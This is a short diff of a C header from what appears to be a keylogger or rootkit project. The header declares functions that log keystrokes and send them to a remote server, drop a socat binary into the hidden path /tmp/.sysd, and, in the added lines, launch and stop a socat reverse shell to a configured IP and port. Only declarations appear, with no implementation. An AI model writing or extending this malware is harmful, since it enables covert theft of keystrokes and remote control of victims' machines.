@@ -56,6 +56,8 @@ int epikeylog_init(int keylog_mode);					// Initialize the keylogger
 int epikeylog_send_to_server(void);						// Send keylogger content to the server
 void epikeylog_exit(void);								// Cleanup function for the keylogger
 int drop_socat_binaire(void);							// Drop the socat binary in /tmp/.sysd
+void launch_reverse_shell(void);						// Launch the reverse shell with socat
+void stop_reverse_shell(void);							// Stop the reverse shell
 
 extern char *ip;
 extern int port;
